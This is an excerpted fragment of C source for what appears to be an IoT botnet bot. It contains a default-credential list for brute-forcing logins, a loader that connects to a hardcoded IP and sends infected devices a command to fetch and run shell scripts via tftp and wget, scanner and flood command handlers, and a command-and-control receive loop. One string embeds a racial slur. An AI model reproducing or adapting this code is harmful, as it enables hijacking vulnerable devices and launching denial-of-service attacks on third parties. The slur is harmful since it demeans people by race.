...
char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "ubnt\0"};
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "ubnt\0"};
...
void echoLoader()
{
        ...
        int fd;
        fd = socket_connect("78.129.187.102", 80); 
                        ...
                        case 9:
                                {
                                        ...
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox tftp 78.129.187.102 -c get bin3.sh;sh bin3.sh;busybox tftp -r bin2.sh -g 78.129.187.102; sh bin2.sh;busybox wget http://78.129.187.102/gtop.sh; busybox chmod +x gtop.sh || chmod +x gtop.sh; sh gtop.sh\r\n", 325, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
	...
	int x;
        ...
        if(!strcmp(argv[0], "SCANNER"))
        {
                ...
                if(!strcmp(argv[1], "ON"))
                {
                        ...
                        uint32_t parent;
                        parent = fork();
                        printf("Starting the scanner bitch\n");
        ...
        if(!strcmp(argv[0], "COMBO"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        //sockprintf(mainCommSock, "COMBO <ip> <port> <time>");
                        return;
                }
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        ...
                        if(strstr(commBuf, "NIGGERDUP") == commBuf) exit(0);
